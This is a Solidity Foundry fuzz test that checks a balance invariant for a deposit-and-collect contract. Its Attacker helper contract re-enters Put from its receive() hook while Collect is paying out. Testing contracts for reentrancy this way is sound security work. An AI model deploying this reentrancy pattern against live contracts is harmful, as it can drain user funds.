pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    Attacker attacker;

    function setUp() public {
        c = new C(address(this));
        attacker = new Attacker(c);
        vm.deal(address(attacker), 10 ether);
    }

    function testFuzz_property(uint256 depositAmount, uint256 collectAmount) public {
        vm.assume(depositAmount > 0 && depositAmount <= 10 ether);
        vm.assume(collectAmount > 0 && collectAmount <= depositAmount);

        // Record initial balances
        uint256 initTotalBalance = sumAllBalances();
        uint256 initEth = address(c).balance;
        uint256 initInvariant = initTotalBalance + initEth;

        // Deposit into attacker's account
        vm.prank(address(attacker));
        c.Put{value: depositAmount}(block.timestamp + 1000);

        // Fast-forward past unlock time
        vm.warp(block.timestamp + 2000);

        // Attacker initiates Collect which reenters Put during the external call
        vm.prank(address(attacker));
        attacker.attack(collectAmount);

        uint256 finalTotalBalance = sumAllBalances();
        uint256 finalEth = address(c).balance;
        uint256 finalInvariant = finalTotalBalance + finalEth;

        assertEq(finalInvariant, initInvariant);
    }

    function sumAllBalances() internal view returns (uint256 sum) {
        // Only two possible holders: address(this) (Log contract) and the attacker
        // Log contract never holds balance, so just check attacker's Acc balance
        sum = c.Acc(address(attacker)).balance;
    }
}

contract Attacker {
    C public target;
    uint256 public collectAmt;
    uint256 public depositAmt;
    bool public reentered;

    constructor(C _target) {
        target = _target;
    }

    function attack(uint256 _collectAmt) external {
        collectAmt = _collectAmt;
        // Deposit amount to reenter with is whatever msg.value we have left
        depositAmt = address(this).balance;
        reentered = false;
        target.Collect(collectAmt);
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            // Reenter Put with the deposited amount, no additional value sent
            target.Put(block.timestamp + 1000);
        }
    }
}

